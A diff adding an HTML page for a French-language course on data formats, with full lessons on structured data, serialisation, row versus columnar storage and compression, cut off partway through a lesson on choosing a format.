@@ -1,0 +1,2342 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Formats de Données — CSV, JSON, Parquet, XML</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@500;600;700;800&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+<style>
+  :root {
+    --bg:         #fafaf9;
+    --bg-alt:     #f0efec;
+    --bg-card:    #ffffff;
+    --text:       #1e1e1c;
+    --text-muted: #6b6b63;
+    --border:     #e3e1db;
+    --border2:    #d3d1c8;
+
+    --neutral:      #3d5a80;
+    --neutral-dim:  #e8edf3;
+    --csv:          #2e7d5b;
+    --csv-dim:      #e5f2ec;
+    --json:         #b5790f;
+    --json-dim:     #faf0dc;
+    --xml:          #7c3aed;
+    --xml-dim:      #f0e9fd;
+    --parquet:      #1d6fa5;
+    --parquet-dim:  #e2f0f8;
+    --pitfall:      #c1440e;
+    --pitfall-dim:  #fbe9e1;
+
+    --font-display: 'Manrope', sans-serif;
+    --font-body: 'IBM Plex Sans', sans-serif;
+    --font-mono: 'IBM Plex Mono', monospace;
+
+    --sidebar-width: 300px;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: var(--font-body);
+    color: var(--text);
+    background: var(--bg);
+    line-height: 1.7;
+  }
+
+  .layout { display: flex; min-height: 100vh; }
+
+  /* ---- Sidebar ---- */
+  .sidebar {
+    width: var(--sidebar-width);
+    flex-shrink: 0;
+    background: var(--bg-card);
+    border-right: 1px solid var(--border);
+    padding: 1.75rem 1.25rem 2rem;
+    overflow-y: auto;
+    position: sticky;
+    top: 0;
+    height: 100vh;
+  }
+
+  .sidebar-header {
+    position: relative;
+    padding-bottom: 1.25rem;
+    margin-bottom: 1.25rem;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .sidebar-header .eyebrow {
+    font-family: var(--font-mono);
+    font-size: 0.7rem;
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+    color: var(--neutral);
+    display: block;
+    margin-bottom: 0.4rem;
+  }
+
+  .sidebar h1 {
+    font-family: var(--font-display);
+    font-size: 1.1rem;
+    font-weight: 800;
+    line-height: 1.35;
+  }
+
+  /* signature : badges type "tag de fichier" */
+  .format-tags {
+    display: flex;
+    gap: 0.35rem;
+    margin-top: 0.9rem;
+    flex-wrap: wrap;
+  }
+  .tag {
+    font-family: var(--font-mono);
+    font-size: 0.68rem;
+    font-weight: 600;
+    padding: 0.2rem 0.5rem;
+    border-radius: 5px;
+  }
+  .tag.csv { background: var(--csv-dim); color: var(--csv); }
+  .tag.json { background: var(--json-dim); color: var(--json); }
+  .tag.xml { background: var(--xml-dim); color: var(--xml); }
+  .tag.parquet { background: var(--parquet-dim); color: var(--parquet); }
+
+  .module-group { margin-bottom: 0.35rem; }
+
+  .module-title {
+    font-family: var(--font-display);
+    font-weight: 700;
+    font-size: 0.9rem;
+    padding: 0.6rem 0.5rem;
+    cursor: pointer;
+    border-radius: 8px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 0.5rem;
+    color: var(--text);
+  }
+  .module-title:hover { background: var(--bg-alt); }
+  .module-title .mtag {
+    font-family: var(--font-mono);
+    font-size: 0.62rem;
+    font-weight: 600;
+    padding: 0.12rem 0.4rem;
+    border-radius: 4px;
+    flex-shrink: 0;
+  }
+
+  .lesson-list { list-style: none; padding-left: 0.6rem; margin-bottom: 0.5rem; }
+  .lesson-list li a {
+    display: flex;
+    align-items: center;
+    gap: 0.55rem;
+    padding: 0.4rem 0.5rem;
+    border-radius: 7px;
+    color: var(--text-muted);
+    text-decoration: none;
+    font-size: 0.86rem;
+  }
+  .lesson-list li a:hover { background: var(--bg-alt); color: var(--text); }
+  .lesson-list li a.active { color: var(--text); font-weight: 600; background: var(--bg-alt); }
+
+  .lesson-check {
+    width: 12px; height: 12px; flex-shrink: 0;
+    border: 1.5px solid var(--border2); border-radius: 3px;
+  }
+  .lesson-check.done { background: var(--neutral); border-color: var(--neutral); }
+
+  /* ---- Barre de progression ---- */
+  .progress-bar {
+    height: 4px;
+    background: var(--border);
+    position: sticky; top: 0; z-index: 10;
+  }
+  .progress-bar-fill {
+    height: 100%;
+    background: linear-gradient(90deg, var(--csv), var(--json), var(--xml), var(--parquet));
+    width: 0%;
+    transition: width 0.2s ease;
+  }
+
+  /* ---- Contenu principal ---- */
+  .content {
+    flex: 1;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 3rem 2rem 6rem;
+  }
+
+  .content section {
+    margin-bottom: 4rem;
+    border-left: 3px solid var(--border);
+    padding-left: 1.5rem;
+  }
+  .content section.fmt-csv { border-left-color: var(--csv); }
+  .content section.fmt-json { border-left-color: var(--json); }
+  .content section.fmt-xml { border-left-color: var(--xml); }
+  .content section.fmt-parquet { border-left-color: var(--parquet); }
+  .content section.fmt-neutral { border-left-color: var(--neutral); }
+
+  .lesson-kicker {
+    font-family: var(--font-mono);
+    font-size: 0.76rem;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    margin-bottom: 0.6rem;
+    display: block;
+  }
+  .lesson-kicker .fmt-badge {
+    font-weight: 700;
+    padding: 0.05rem 0.4rem;
+    border-radius: 4px;
+    margin-right: 0.4rem;
+  }
+  .fmt-csv .fmt-badge { background: var(--csv-dim); color: var(--csv); }
+  .fmt-json .fmt-badge { background: var(--json-dim); color: var(--json); }
+  .fmt-xml .fmt-badge { background: var(--xml-dim); color: var(--xml); }
+  .fmt-parquet .fmt-badge { background: var(--parquet-dim); color: var(--parquet); }
+  .fmt-neutral .fmt-badge { background: var(--neutral-dim); color: var(--neutral); }
+
+  .content h2 {
+    font-family: var(--font-display);
+    font-size: 1.7rem;
+    font-weight: 800;
+    margin-bottom: 1.1rem;
+    line-height: 1.3;
+  }
+  .content h3 {
+    font-family: var(--font-display);
+    font-weight: 700;
+    font-size: 1.1rem;
+    margin: 1.75rem 0 0.75rem;
+    color: var(--text);
+  }
+  .content p, .content ul, .content ol { margin-bottom: 1.1rem; }
+  .content ul, .content ol { padding-left: 1.4rem; }
+  .content li { margin-bottom: 0.4rem; }
+  .content strong { color: var(--text); }
+  .content code {
+    font-family: var(--font-mono);
+    background: var(--bg-alt);
+    padding: 0.15rem 0.4rem;
+    border-radius: 4px;
+    font-size: 0.87em;
+  }
+
+  pre {
+    border-radius: 10px;
+    padding: 1.1rem 1.2rem;
+    overflow-x: auto;
+    margin: 1.2rem 0;
+    font-size: 0.85rem;
+  }
+  pre code { background: none; padding: 0; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.2rem 0;
+    font-size: 0.9rem;
+  }
+  th, td {
+    text-align: left;
+    padding: 0.55rem 0.75rem;
+    border-bottom: 1px solid var(--border);
+  }
+  th { font-family: var(--font-display); font-size: 0.82rem; color: var(--text-muted); }
+
+  .callout {
+    border-left: 4px solid var(--neutral);
+    background: var(--neutral-dim);
+    padding: 1rem 1.2rem;
+    border-radius: 0 10px 10px 0;
+    margin: 1.4rem 0;
+  }
+  .callout strong {
+    font-family: var(--font-display);
+    display: block;
+    margin-bottom: 0.3rem;
+    font-size: 0.9rem;
+  }
+  .callout.pitfall { border-left-color: var(--pitfall); background: var(--pitfall-dim); }
+  .callout.exercise { border-left-color: var(--csv); background: var(--csv-dim); }
+
+  .module-divider {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    margin: 0 0 2.5rem;
+    color: var(--text-muted);
+  }
+  .module-divider .num {
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+    font-weight: 600;
+    color: var(--text);
+    background: var(--bg-alt);
+    padding: 0.3rem 0.6rem;
+    border-radius: 6px;
+    flex-shrink: 0;
+  }
+  .module-divider .line { flex: 1; height: 1px; background: var(--border2); }
+
+  .menu-toggle { display: none; }
+
+  @media (max-width: 768px) {
+    .sidebar {
+      position: fixed;
+      left: -100%;
+      z-index: 20;
+      transition: left 0.2s ease;
+      box-shadow: 4px 0 12px rgba(0,0,0,0.12);
+      width: 85%;
+      max-width: 320px;
+    }
+    .sidebar.open { left: 0; }
+    .menu-toggle {
+      display: block;
+      position: fixed;
+      top: 1rem; left: 1rem;
+      z-index: 30;
+      background: var(--neutral);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 0.55rem 0.8rem;
+      cursor: pointer;
+      font-size: 1rem;
+    }
+    .content { padding: 4.5rem 1.25rem 3rem; }
+    .content section { padding-left: 1rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="progress-bar"><div class="progress-bar-fill" id="progressFill"></div></div>
+<button class="menu-toggle" id="menuToggle">☰</button>
+
+<div class="layout">
+  <nav class="sidebar" id="sidebar">
+    <div class="sidebar-header">
+      <span class="eyebrow">Bloc 1 · Fondations Data · Cours 4/4</span>
+      <h1>Formats de Données</h1>
+      <div class="format-tags">
+        <span class="tag csv">.csv</span>
+        <span class="tag json">.json</span>
+        <span class="tag xml">.xml</span>
+        <span class="tag parquet">.parquet</span>
+      </div>
+    </div>
+
+    <div class="module-group">
+      <div class="module-title"><span>01 · Fondamentaux</span> <span class="mtag" style="background:var(--neutral-dim);color:var(--neutral)">CORE</span></div>
+      <ul class="lesson-list">
+        <li><a href="#m1-l1" data-lesson="m1-l1"><span class="lesson-check"></span> Structuré, Semi et Non-Structuré</a></li>
+        <li><a href="#m1-l2" data-lesson="m1-l2"><span class="lesson-check"></span> Sérialisation et Désérialisation</a></li>
+        <li><a href="#m1-l3" data-lesson="m1-l3"><span class="lesson-check"></span> Stockage Lignes vs Colonnes</a></li>
+        <li><a href="#m1-l4" data-lesson="m1-l4"><span class="lesson-check"></span> Compression et Encodage</a></li>
+        <li><a href="#m1-l5" data-lesson="m1-l5"><span class="lesson-check"></span> Comment Choisir un Format</a></li>
+      </ul>
+    </div>
+
+    <div class="module-group">
+      <div class="module-title"><span>02 · CSV en Profondeur</span> <span class="mtag" style="background:var(--csv-dim);color:var(--csv)">.csv</span></div>
+      <ul class="lesson-list">
+        <li><a href="#m2-l1" data-lesson="m2-l1"><span class="lesson-check"></span> Anatomie d'un Fichier CSV</a></li>
+        <li><a href="#m2-l2" data-lesson="m2-l2"><span class="lesson-check"></span> Le Piège de l'Encodage</a></li>
+        <li><a href="#m2-l3" data-lesson="m2-l3"><span class="lesson-check"></span> Le Typage Fantôme</a></li>
+        <li><a href="#m2-l4" data-lesson="m2-l4"><span class="lesson-check"></span> CSV Malformés et Cas Limites</a></li>
+        <li><a href="#m2-l5" data-lesson="m2-l5"><span class="lesson-check"></span> Lire/Écrire des CSV Performants</a></li>
+      </ul>
+    </div>
+
+    <div class="module-group">
+      <div class="module-title"><span>03 · JSON en Profondeur</span> <span class="mtag" style="background:var(--json-dim);color:var(--json)">.json</span></div>
+      <ul class="lesson-list">
+        <li><a href="#m3-l1" data-lesson="m3-l1"><span class="lesson-check"></span> Anatomie de JSON</a></li>
+        <li><a href="#m3-l2" data-lesson="m3-l2"><span class="lesson-check"></span> JSON Lines (NDJSON)</a></li>
+        <li><a href="#m3-l3" data-lesson="m3-l3"><span class="lesson-check"></span> Structures Imbriquées</a></li>
+        <li><a href="#m3-l4" data-lesson="m3-l4"><span class="lesson-check"></span> Valider avec JSON Schema</a></li>
+        <li><a href="#m3-l5" data-lesson="m3-l5"><span class="lesson-check"></span> Manipuler JSON en Python</a></li>
+      </ul>
+    </div>
+
+    <div class="module-group">
+      <div class="module-title"><span>04 · XML en Profondeur</span> <span class="mtag" style="background:var(--xml-dim);color:var(--xml)">.xml</span></div>
+      <ul class="lesson-list">
+        <li><a href="#m4-l1" data-lesson="m4-l1"><span class="lesson-check"></span> Anatomie de XML</a></li>
+        <li><a href="#m4-l2" data-lesson="m4-l2"><span class="lesson-check"></span> DTD et XML Schema (XSD)</a></li>
+        <li><a href="#m4-l3" data-lesson="m4-l3"><span class="lesson-check"></span> XPath : Naviguer dans XML</a></li>
+        <li><a href="#m4-l4" data-lesson="m4-l4"><span class="lesson-check"></span> Pourquoi XML Domine Encore</a></li>
+        <li><a href="#m4-l5" data-lesson="m4-l5"><span class="lesson-check"></span> Parser XML en Python</a></li>
+      </ul>
+    </div>
+
+    <div class="module-group">
+      <div class="module-title"><span>05 · Parquet & Columnar</span> <span class="mtag" style="background:var(--parquet-dim);color:var(--parquet)">.parquet</span></div>
+      <ul class="lesson-list">
+        <li><a href="#m5-l1" data-lesson="m5-l1"><span class="lesson-check"></span> Le Stockage Columnar</a></li>
+        <li><a href="#m5-l2" data-lesson="m5-l2"><span class="lesson-check"></span> Anatomie d'un Fichier Parquet</a></li>
+        <li><a href="#m5-l3" data-lesson="m5-l3"><span class="lesson-check"></span> Compression et Encodages</a></li>
+        <li><a href="#m5-l4" data-lesson="m5-l4"><span class="lesson-check"></span> Predicate Pushdown</a></li>
+        <li><a href="#m5-l5" data-lesson="m5-l5"><span class="lesson-check"></span> Lire/Écrire avec PyArrow</a></li>
+      </ul>
+    </div>
+
+    <div class="module-group">
+      <div class="module-title"><span>06 · Comparaison</span> <span class="mtag" style="background:var(--neutral-dim);color:var(--neutral)">CORE</span></div>
+      <ul class="lesson-list">
+        <li><a href="#m6-l1" data-lesson="m6-l1"><span class="lesson-check"></span> Tableau Comparatif Complet</a></li>
+        <li><a href="#m6-l2" data-lesson="m6-l2"><span class="lesson-check"></span> Quel Format pour Quel Usage</a></li>
+        <li><a href="#m6-l3" data-lesson="m6-l3"><span class="lesson-check"></span> Alternatives : Avro, ORC, Protobuf</a></li>
+        <li><a href="#m6-l4" data-lesson="m6-l4"><span class="lesson-check"></span> Le Piège du Format Hérité</a></li>
+      </ul>
+    </div>
+
+    <div class="module-group">
+      <div class="module-title"><span>07 · Conversion & Pipelines</span> <span class="mtag" style="background:var(--neutral-dim);color:var(--neutral)">CORE</span></div>
+      <ul class="lesson-list">
+        <li><a href="#m7-l1" data-lesson="m7-l1"><span class="lesson-check"></span> Convertir sans Perte d'Information</a></li>
+        <li><a href="#m7-l2" data-lesson="m7-l2"><span class="lesson-check"></span> Le Piège des Types à la Conversion</a></li>
+        <li><a href="#m7-l3" data-lesson="m7-l3"><span class="lesson-check"></span> Formats dans un Pipeline Moderne</a></li>
+        <li><a href="#m7-l4" data-lesson="m7-l4"><span class="lesson-check"></span> Schema Evolution</a></li>
+      </ul>
+    </div>
+
+    <div class="module-group">
+      <div class="module-title"><span>08 · Perf & Sécurité</span> <span class="mtag" style="background:var(--neutral-dim);color:var(--neutral)">CORE</span></div>
+      <ul class="lesson-list">
+        <li><a href="#m8-l1" data-lesson="m8-l1"><span class="lesson-check"></span> Benchmarks Réels par Format</a></li>
+        <li><a href="#m8-l2" data-lesson="m8-l2"><span class="lesson-check"></span> Streaming de Gros Fichiers</a></li>
+        <li><a href="#m8-l3" data-lesson="m8-l3"><span class="lesson-check"></span> Sécurité : Injection CSV et XXE</a></li>
+        <li><a href="#m8-l4" data-lesson="m8-l4"><span class="lesson-check"></span> Checklist de Choix de Format</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <main class="content">
+    <div class="module-divider">
+      <span class="num">MODULE 01 · FONDAMENTAUX</span>
+      <span class="line"></span>
+    </div>
+
+    <section id="m1-l1" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 1 · Leçon 1</span>
+      <h2>Données Structurées, Semi-Structurées, Non-Structurées</h2>
+
+      <p>Avant de comparer CSV, JSON, XML et Parquet entre eux, il faut situer chacun sur un axe fondamental : à quel point la structure des données est-elle explicite, fixe, et vérifiable mécaniquement ? Cette distinction n'est pas académique — elle détermine directement quels outils peuvent traiter le fichier, à quelle vitesse, et avec quel niveau de confiance dans la cohérence du résultat.</p>
+
+      <p>Les <strong>données structurées</strong> respectent un schéma rigide et uniforme : chaque enregistrement a exactement les mêmes colonnes, dans le même ordre, avec des types cohérents (une table SQL, un fichier Parquet, un CSV bien formé). Le schéma peut être déduit ou imposé <em>a priori</em>, et toute déviation est une anomalie détectable. Les <strong>données semi-structurées</strong> ont une organisation logique (hiérarchie, clés-valeurs) mais sans schéma rigide imposé — deux enregistrements JSON peuvent avoir des champs différents, des niveaux d'imbrication variables, ou des champs optionnels absents plutôt que remplis par une valeur vide. Les <strong>données non-structurées</strong> (texte libre, images, audio, PDF) n'ont aucune organisation exploitable directement par un moteur de requête — elles nécessitent une étape d'extraction ou de parsing pour en tirer de la structure.</p>
+
+      <table>
+        <tr><th>Format</th><th>Catégorie</th><th>Schéma</th></tr>
+        <tr><td>CSV</td><td>Structuré (par convention)</td><td>Implicite, non vérifié par le format lui-même</td></tr>
+        <tr><td>JSON</td><td>Semi-structuré</td><td>Optionnel (JSON Schema en complément)</td></tr>
+        <tr><td>XML</td><td>Semi-structuré</td><td>Optionnel mais formalisable (DTD, XSD)</td></tr>
+        <tr><td>Parquet</td><td>Structuré</td><td>Intégré et obligatoire dans le fichier</td></tr>
+      </table>
+
+      <p>Le point souvent mal compris : CSV est <em>traité comme</em> structuré par convention (chaque ligne = un enregistrement avec les mêmes colonnes), mais le format lui-même n'impose ou ne vérifie absolument rien — rien n'empêche techniquement une ligne d'avoir 3 colonnes et la suivante 7. C'est l'outil qui lit le fichier qui suppose la structure, pas le format qui la garantit. Parquet, à l'inverse, embarque un schéma formel dans ses métadonnées : impossible d'avoir un fichier Parquet dont les lignes ne respectent pas un schéma cohérent.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Traiter "structuré" comme synonyme de "fiable" et "non-structuré" comme synonyme de "à éviter". Un CSV structuré généré par un export manuel bugué peut être bien moins fiable qu'un JSON semi-structuré produit par une API bien testée. La catégorie du format ne garantit rien sur la qualité des données qu'il contient — seulement sur la façon dont leur structure peut être vérifiée mécaniquement.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Classez ces trois sources de données selon les trois catégories vues ici : (1) un export de base de données au format CSV, (2) une réponse d'API REST contenant des champs optionnels absents selon les cas, (3) le corps d'un email. Pour chacune, identifiez l'obstacle principal si vous deviez l'agréger dans une table unique.
+      </div>
+    </section>
+
+    <section id="m1-l2" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 1 · Leçon 2</span>
+      <h2>Sérialisation et Désérialisation : Ce Qui Se Passe Vraiment</h2>
+
+      <p>Un format de données existe pour résoudre un problème précis : les structures de données en mémoire d'un programme (objets, tableaux, dictionnaires) ne peuvent pas être écrites directement sur un disque ou envoyées sur un réseau — elles doivent d'abord être converties en une séquence linéaire d'octets ou de caractères. Ce processus s'appelle la <strong>sérialisation</strong> ; l'opération inverse, qui reconstruit la structure en mémoire à partir de cette séquence, est la <strong>désérialisation</strong>.</p>
+
+      <pre><code class="language-python">import json
+
+# Sérialisation : structure Python en mémoire -> chaîne de caractères (JSON)
+donnees = {"nom": "Alice", "age": 30, "actif": True}
+chaine_json = json.dumps(donnees)
+print(chaine_json)          # '{"nom": "Alice", "age": 30, "actif": true}'
+print(type(chaine_json))    # &lt;class 'str'&gt;
+
+# Désérialisation : chaîne -> structure Python en mémoire
+donnees_reconstruites = json.loads(chaine_json)
+print(donnees_reconstruites)       # {'nom': 'Alice', 'age': 30, 'actif': True}
+print(type(donnees_reconstruites)) # &lt;class 'dict'&gt;</code></pre>
+
+      <p>Chaque format fait des choix différents à cette étape, et ces choix ont des conséquences concrètes. JSON sérialise en texte lisible par un humain, avec un jeu de types limité (chaînes, nombres, booléens, null, objets, tableaux) — il n'existe par exemple aucune représentation native pour une date, une heure ou un nombre décimal de précision arbitraire, ce qui oblige chaque application à adopter sa propre convention (chaîne ISO 8601 pour les dates, généralement). Parquet, à l'inverse, sérialise en <strong>binaire</strong> avec un typage riche et strict (entiers sur 32 ou 64 bits, décimaux de précision fixe, timestamps avec fuseau horaire) directement encodé dans le format — plus rapide et plus précis, mais illisible sans un outil dédié.</p>
+
+      <h3>Le coût caché : chaque sérialisation/désérialisation a un prix en CPU</h3>
+      <p>Convertir une structure en mémoire vers un format texte (JSON, XML, CSV) implique de parcourir la structure et de produire des caractères un par un — une opération relativement coûteuse en temps CPU comparée à un format binaire où les types natifs (entiers, flottants) sont déjà stockés dans leur représentation mémoire et peuvent être copiés presque directement. C'est une des raisons pour lesquelles les formats binaires comme Parquet ou Protobuf sont privilégiés dans les pipelines à très fort volume, où la sérialisation/désérialisation répétée de millions d'enregistrements devient un goulot d'étranglement mesurable.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Sérialiser et désérialiser des données en JSON de façon répétée dans une boucle critique en performance (par exemple, un microservice qui reçoit et retransmet des milliers de messages par seconde) sans mesurer le coût réel de cette conversion. Sur des volumes élevés, ce coût, invisible au développement, devient un facteur limitant identifiable au profiling en production.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Un système envoie 50 000 messages JSON par seconde entre deux microservices internes (jamais lus par un humain). Pourquoi la sérialisation JSON pourrait-elle être un mauvais choix ici comparée à un format binaire comme Protobuf, alors que JSON reste parfaitement adapté pour une API publique consommée par des développeurs externes ?
+      </div>
+    </section>
+
+    <section id="m1-l3" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 1 · Leçon 3</span>
+      <h2>Stockage en Lignes vs en Colonnes : Deux Philosophies</h2>
+
+      <p>C'est la distinction technique la plus structurante de ce cours, et celle qui explique à elle seule pourquoi Parquet existe et pourquoi il domine l'analytique moderne malgré l'existence bien antérieure de CSV et JSON. Elle porte sur la façon dont les valeurs sont physiquement disposées sur le disque.</p>
+
+      <p>Dans un <strong>stockage orienté ligne</strong> (row-oriented) — CSV, JSON, XML, une base de données transactionnelle classique — toutes les valeurs d'un même enregistrement sont stockées consécutivement sur le disque avant de passer à l'enregistrement suivant :</p>
+
+      <pre><code class="language-text">Stockage ligne (CSV) :
+id=1,nom=Alice,age=30 | id=2,nom=Bob,age=25 | id=3,nom=Carla,age=41 | ...</code></pre>
+
+      <p>Dans un <strong>stockage orienté colonne</strong> (columnar) — Parquet, ORC — toutes les valeurs d'une même colonne sont regroupées et stockées consécutivement, indépendamment des autres colonnes :</p>
+
+      <pre><code class="language-text">Stockage colonne (Parquet) :
+id:    1, 2, 3, ...
+nom:   Alice, Bob, Carla, ...
+age:   30, 25, 41, ...</code></pre>
+
+      <h3>Pourquoi cette différence a un impact énorme sur la performance analytique</h3>
+      <p>Considérez une requête analytique typique : "quelle est la moyenne d'âge de mes 500 millions de clients ?" Cette requête n'a besoin que de la colonne <code>age</code> — aucune des autres colonnes n'est nécessaire. En stockage orienté ligne, le moteur doit malgré tout lire <em>l'intégralité</em> de chaque enregistrement du disque (id, nom, age, adresse, email...) pour en extraire uniquement l'âge, gaspillant l'essentiel de la bande passante disque sur des données qui seront immédiatement ignorées. En stockage orienté colonne, le moteur lit <em>uniquement</em> le bloc contenant la colonne <code>age</code>, ignorant physiquement toutes les autres colonnes — une réduction d'I/O disque potentiellement de plusieurs ordres de grandeur sur des tables larges (50+ colonnes).</p>
+
+      <h3>L'inverse est vrai pour les opérations transactionnelles</h3>
+      <p>À l'inverse, une opération qui lit ou écrit un enregistrement <em>complet</em> à la fois — "récupérer toutes les informations du client 42" ou "insérer une nouvelle commande" — est plus efficace en stockage orienté ligne, car toutes les valeurs de cet enregistrement sont physiquement voisines sur le disque. C'est pourquoi les bases de données transactionnelles (OLTP — PostgreSQL, MySQL) restent orientées ligne, tandis que les systèmes analytiques (OLAP — data warehouses, Parquet sur un data lake) sont orientés colonne. Ce n'est jamais "l'un est meilleur que l'autre" dans l'absolu, mais un choix dicté par le <em>pattern d'accès</em> dominant.</p>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Utiliser un format orienté colonne comme Parquet pour un système qui effectue majoritairement des lectures/écritures d'enregistrements individuels complets (un panier d'achat mis à jour à chaque clic, par exemple). Parquet est optimisé pour des scans analytiques sur de larges volumes, pas pour des mises à jour ponctuelles fréquentes — utiliser Parquet dans ce contexte peut être nettement plus lent qu'une base de données orientée ligne classique.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Une équipe doit choisir entre CSV et Parquet pour stocker une table de 200 colonnes et 100 millions de lignes, sur laquelle 95% des requêtes ne portent que sur 3 à 5 colonnes à la fois pour des calculs d'agrégation. Justifiez le choix technique en expliquant précisément le mécanisme physique qui le motive.
+      </div>
+    </section>
+
+    <section id="m1-l4" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 1 · Leçon 4</span>
+      <h2>Compression et Encodage : Impact sur Taille et Vitesse</h2>
+
+      <p>La taille sur disque et la vitesse de lecture d'un format ne dépendent pas uniquement de son organisation (ligne vs colonne), mais aussi de deux mécanismes souvent confondus : l'<strong>encodage</strong> (comment représenter les valeurs de façon plus compacte que leur forme brute) et la <strong>compression</strong> (un algorithme générique appliqué par-dessus, sans connaissance du contenu).</p>
+
+      <h3>L'encodage : exploiter la structure connue des données</h3>
+      <p>Un encodage exploite une régularité connue dans les données pour les représenter plus efficacement. Deux exemples fondamentaux, utilisés massivement dans Parquet (détaillé au Module 5) :</p>
+      <ul>
+        <li><strong>Dictionary encoding</strong> : si une colonne "pays" ne contient que 190 valeurs distinctes répétées des millions de fois, on stocke une seule fois chaque valeur unique dans un dictionnaire, puis on remplace chaque occurrence par un simple entier (index dans le dictionnaire) — bien plus compact que de répéter la chaîne "France" un million de fois.</li>
+        <li><strong>Run-length encoding (RLE)</strong> : si une colonne triée contient de longues séquences de valeurs identiques consécutives (par exemple une colonne "année" dans des données triées chronologiquement), on stocke la valeur une seule fois accompagnée du nombre de répétitions consécutives, plutôt que chaque occurrence individuellement.</li>
+      </ul>
+
+      <h3>La compression générique : gzip, Snappy, Zstandard</h3>
+      <p>Contrairement à l'encodage, la compression générique (gzip, Snappy, LZ4, Zstandard) ne connaît rien de la structure des données — elle détecte et élimine la redondance statistique dans n'importe quelle séquence d'octets. Elle est presque toujours appliquée <em>en plus</em> de l'encodage spécifique au format (l'encodage réduit d'abord la taille en exploitant la structure connue, puis la compression générique réduit encore la redondance résiduelle).</p>
+
+      <pre><code class="language-python">import pandas as pd
+import numpy as np
+
+df = pd.DataFrame({
+    "id": range(1_000_000),
+    "pays": np.random.choice(["France", "Allemagne", "Espagne", "Italie"], 1_000_000),
+    "montant": np.random.uniform(10, 500, 1_000_000)
+})
+
+# Comparaison de taille selon la compression Parquet
+df.to_parquet("test_snappy.parquet", compression="snappy")
+df.to_parquet("test_gzip.parquet", compression="gzip")
+df.to_parquet("test_none.parquet", compression=None)
+
+import os
+for f in ["test_none.parquet", "test_snappy.parquet", "test_gzip.parquet"]:
+    print(f"{f}: {os.path.getsize(f) / 1024:.0f} Ko")
+# gzip compresse généralement mieux mais plus lentement que Snappy à la lecture/écriture</code></pre>
+
+      <h3>Le compromis vitesse vs taux de compression</h3>
+      <table>
+        <tr><th>Algorithme</th><th>Vitesse</th><th>Taux de compression</th><th>Usage typique</th></tr>
+        <tr><td>Snappy</td><td>Très rapide</td><td>Modéré</td><td>Défaut Parquet en contexte analytique fréquent</td></tr>
+        <tr><td>Gzip</td><td>Lent</td><td>Élevé</td><td>Archivage, transfert réseau où la taille prime</td></tr>
+        <tr><td>Zstandard (zstd)</td><td>Rapide</td><td>Élevé</td><td>Bon compromis moderne, de plus en plus le défaut</td></tr>
+        <tr><td>LZ4</td><td>Extrêmement rapide</td><td>Faible</td><td>Streaming temps réel où la latence prime absolument</td></tr>
+      </table>
+
+      <div class="callout pitfall">
+        <strong>Piège courant</strong>
+        Choisir systématiquement la compression qui donne le fichier le plus petit sans mesurer l'impact sur le temps de <em>lecture</em>. Une compression plus agressive (gzip) réduit la taille sur disque mais augmente le CPU nécessaire pour décompresser à la lecture — sur un pipeline où la même donnée est lue des milliers de fois (data warehouse), le coût cumulé de décompression peut largement dépasser l'économie d'espace disque, qui est aujourd'hui bien moins coûteux que le CPU.
+      </div>
+
+      <div class="callout exercise">
+        <strong>Exercice</strong>
+        Vous devez choisir un algorithme de compression pour des fichiers Parquet lus des centaines de fois par jour par différentes équipes d'analystes, mais écrits une seule fois par nuit. Le temps d'écriture est-il un facteur de décision important ici ? Quel algorithme du tableau privilégieriez-vous, et pourquoi ?
+      </div>
+    </section>
+
+    <section id="m1-l5" class="fmt-neutral">
+      <span class="lesson-kicker"><span class="fmt-badge">CORE</span>Module 1 · Leçon 5</span>
+      <h2>Comment Choisir un Format : les Questions à se Poser</h2>
+
+      <p>Cette leçon de clôture du module fondamental propose une méthode pour aborder n'importe quelle décision de format avec une grille de lecture stable, avant même de connaître les spécificités techniques de CSV, JSON, XML et Parquet qui seront détaillées dans les modules suivants.</p>
+
+      <h3>Les cinq questions à poser systématiquement</h3>
+      <ol>
+        <li><strong>Qui va lire ce fichier ?</strong> Un humain qui doit l'ouvrir dans un tableur ou un éditeur de texte (CSV, JSON) ? Uniquement une machine dans un pipeline automatisé (Parquet) ? Un système tiers imposant son propre format (souvent XML dans les échanges B2B historiques) ?</li>
+        <li><strong>Quel est le volume de données ?</strong> Quelques centaines de lignes (le format importe peu) ou des centaines de millions (le format devient déterminant pour la performance) ?</li>
+        <li><strong>Quel est le pattern d'accès dominant ?</strong> Lecture complète d'enregistrements individuels (orienté ligne) ou agrégations sur un sous-ensemble de colonnes (orienté colonne, voir leçon 3) ?</li>
